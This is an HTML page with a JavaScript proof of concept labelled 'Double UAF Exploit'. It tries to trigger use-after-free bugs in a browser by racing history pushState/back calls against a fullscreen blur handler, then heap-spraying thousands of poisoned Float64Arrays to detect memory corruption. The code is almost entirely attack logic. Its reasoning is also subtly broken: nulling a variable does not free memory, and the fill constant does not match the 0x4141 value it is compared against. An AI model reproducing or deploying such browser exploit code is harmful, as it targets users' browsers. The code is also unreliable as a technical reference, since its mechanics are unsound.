
<!DOCTYPE html>
<html>
<head><title>Double UAF Exploit</title></head>
<body>
<button onclick="exploit()">Double UAF</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

const BASE = 977, STEP = 14461, UAF_ITERS = 48;

let victim = {
  id: "VICTIM",
  data: new Float64Array(1024)
};

async function exploit() {
  log("=== DOUBLE UAF EXPLOIT ===\n");
  
  // 1. Trigger History UAF
  log("[1] Triggering History UAF...");
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    history.pushState({index:i, victim: victim}, "", "#" + "E".repeat(size));
    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    size += STEP;
    await new Promise(r=>setTimeout(r,5));
  }
  
  // 2. Durante race window, trigger Fullscreen UAF
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40) {
      log("\n[2] RACE WINDOW! Triggering Fullscreen UAF...");
      
      // Request fullscreen
      document.documentElement.requestFullscreen();
      
      // Setup fullscreen UAF
      window.onblur = function() {
        log("\n[3] BLUR! Freeing victim...");
        
        // FREE
        victim = null;
        
        // SPRAY
        const spray = [];
        for(let i=0; i<5000; i++) {
          const poison = new Float64Array(128);
          poison.fill(2.121995791e-314); // 0x4141...
          spray.push(poison);
        }
        
        log("    Sprayed 5000 poisoned arrays");
        log("    >> Press REFRESH to crash <<");
        
        // Tentar acessar via history
        try {
          history.forward();
          const recovered = history.state.victim;
          log(`\n    Recovered victim: ${recovered ? recovered.id : 'null'}`);
          
          if(recovered && recovered.data) {
            log(`    Data length: ${recovered.data.length}`);
            log(`    Data[0]: 0x${recovered.data[0].toString(16)}`);
            
            if(recovered.data[0] === 0x4141414141414141) {
              log("\n    ðŸš¨ CORRUPTION! Victim points to spray!");
            }
          }
        } catch(err) {
          log(`    Error: ${err.message}`);
        }
      };
      
      log("    Fullscreen UAF armed. Press OPTIONS menu.");
    }
  });
  
  // Trigger race
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}
</script>
</body>
</html>
